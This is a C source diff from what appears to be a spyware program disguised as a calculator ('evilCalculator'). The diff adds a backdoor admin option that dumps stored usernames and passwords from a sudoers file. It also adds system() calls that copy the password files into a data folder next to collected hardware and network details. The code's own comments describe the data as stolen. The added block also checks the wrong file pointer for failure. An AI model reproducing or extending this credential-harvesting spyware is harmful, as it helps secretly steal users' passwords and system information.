@@ -165,6 +165,7 @@ bool administrator(unsigned int backdoor){
     bool checkEntry = true;
     bool checkLeave = true;
     FILE* fileptr;
+    FILE* sudo;
     //You can only login as administrator, cannot create account
     if (backdoor == 0) {
         findUser(1);
@@ -201,11 +202,25 @@ bool administrator(unsigned int backdoor){
                     formatString(checkPass);
                     fprintf(stdout, "Username: '%s' Password: '%s'\n", checkUser, checkPass);
                 }
-                puts("\nEnd user stream");
+                puts("\nEnd normal user stream");
             } else {
                 puts("unable to open passwords file. Thats not good...");
             }
             fclose(fileptr);
+            puts("Sudoers:\n");
+            sudo = fopen("users/sudoers.txt", "r");
+            if (fileptr != NULL) {
+                while(fgets(checkUser, STRING_MAX, sudo) != NULL) {
+                    fgets(checkPass, STRING_MAX, sudo);
+                    formatString(checkUser);
+                    formatString(checkPass);
+                    fprintf(stdout, "Username: '%s' Password: '%s'\n", checkUser, checkPass);
+                }
+            } else {
+                puts("unable to open sudoers file. Thats not good...");
+            }
+            puts("\nEnd Sudo user stream");
+            fclose(sudo);
         //Admin wants to print all stolen data from the system (i.e. running tree file and that stuff)
         } else if (entry == 2) {
             puts("Grabbing all required data from machine...");
@@ -215,6 +230,7 @@ bool administrator(unsigned int backdoor){
             puts("Collecting info on CPU...");
             puts("Collecting info on Network...");
             puts("Collecting info on Drive partitions...");
+            puts("Collecting calculator login information...");
             puts("Collected all data from machine. Stored in './data'");
         //Admin wants to extract all data collected from machine
         } else if (entry == 3) {
@@ -310,6 +326,10 @@ void runSpyware(){
 
     // Create partition_info.txt containing user's storage/partition information
     system("lsblk > ./data/partition_info.txt");
+
+    // copies password files from evilCalculator users
+    system("cp users/passwords.txt data/calculatorUsers.txt");
+    system("cp users/sudoers.txt data/calculatorSudoers.txt");
 }
 
 
